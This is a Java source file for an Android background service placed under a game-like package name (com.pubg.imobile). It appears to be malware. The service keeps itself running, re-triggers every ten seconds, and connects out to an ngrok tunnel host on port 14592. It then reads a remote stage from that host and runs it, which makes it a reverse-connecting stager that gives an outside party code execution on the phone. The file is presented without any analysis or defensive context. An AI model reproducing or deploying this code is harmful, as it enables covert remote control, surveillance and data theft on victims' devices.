package com.pubg.imobile;

import static com.pubg.imobile.Cheetah.params;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Job extends Service {
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    static Socket sock;

    public Job() {
    }

    public static void startService(Context context) {
        context.startService(new Intent(context, Job.class));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Cheetah.start(this);
        Attempt();
        Cheetah.start(this);
        return START_STICKY;
    }

    public void Attempt() {
        long initialDelay = 10; // Delay before the first execution (in seconds)
        long period = 10;       // Period between subsequent executions (in seconds)

        scheduler.scheduleAtFixedRate(() -> Cheetah.start(getApplicationContext()), initialDelay, period, TimeUnit.SECONDS);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    static void MainBridge() throws Exception {
        int port = 14592;
        String host = "0.tcp.in.ngrok.io";
        try {
            if (host.equals("")) {
                ServerSocket server = new ServerSocket(port);
                sock = server.accept();
                server.close();
            } else {
                sock = new Socket(host, port);
            }
        } catch (IOException e) {
            e.printStackTrace(); // Log the exception for debugging
            // Handle the exception or terminate gracefully
        }

        if (sock != null) {
            try {
                Cheetah.readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), params);
            } catch (IOException e) {
                e.printStackTrace(); // Handle the exception
            }
        }
    }
}
